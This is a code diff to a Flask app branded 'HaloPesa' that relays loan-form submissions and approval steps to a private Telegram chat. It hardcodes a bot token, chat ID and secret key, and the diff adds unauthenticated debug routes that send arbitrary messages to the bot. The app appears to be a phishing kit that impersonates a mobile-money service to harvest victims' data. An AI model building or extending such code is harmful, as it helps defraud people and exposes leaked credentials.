@@ -16,12 +16,13 @@ app.secret_key = 'halopesa-new-2024'
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID   = os.environ.get('CHAT_ID')
 
-# Fallback for local testing (use your token)
+# Fallback for local testing – using your new token
 if not BOT_TOKEN:
     BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
 if not CHAT_ID:
     CHAT_ID = '8589275340'
 
+# Set up logging
 logging.basicConfig(level=logging.INFO)
 
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
@@ -63,8 +64,10 @@ def send_telegram(message, reply_markup=None):
         logging.info(f"Telegram send status: {response.status_code}")
         if response.status_code != 200:
             logging.error(f"Telegram response: {response.text}")
+        return response
     except Exception as e:
         logging.error(f'Telegram error: {e}')
+        return None
 
 def edit_telegram(message_id, text):
     try:
@@ -97,11 +100,47 @@ def approve():
 def success():
     return render_template('success.html')
 
+# ============================================
+# 🧪 TEST ROUTES – remove after testing
+# ============================================
 @app.route('/test-telegram')
 def test_telegram():
-    send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
-    return "Test message sent! Check your Telegram."
+    """Send a simple test message."""
+    response = send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
+    if response and response.status_code == 200:
+        return "✅ Test message sent! Check your Telegram."
+    else:
+        return f"❌ Failed to send. Check logs. Response: {response.text if response else 'No response'}"
 
+@app.route('/debug-telegram')
+def debug_telegram():
+    """Show environment variables and send a custom message."""
+    token = BOT_TOKEN[:10] + '...' + BOT_TOKEN[-5:] if BOT_TOKEN else 'None'
+    chat = CHAT_ID
+    html = f"""
+    <h2>Debug Info</h2>
+    <p><strong>BOT_TOKEN:</strong> {token}</p>
+    <p><strong>CHAT_ID:</strong> {chat}</p>
+    <p><a href="/test-telegram">Click here to send test message</a></p>
+    <form action="/send-debug" method="post">
+        <input type="text" name="message" placeholder="Custom message" value="Hello from debug">
+        <button type="submit">Send</button>
+    </form>
+    """
+    return html
+
+@app.route('/send-debug', methods=['POST'])
+def send_debug():
+    msg = request.form.get('message', 'No message')
+    response = send_telegram(msg)
+    if response and response.status_code == 200:
+        return "✅ Message sent!"
+    else:
+        return "❌ Failed to send."
+
+# ============================================
+# 📋 MAIN API ROUTES
+# ============================================
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
     try:
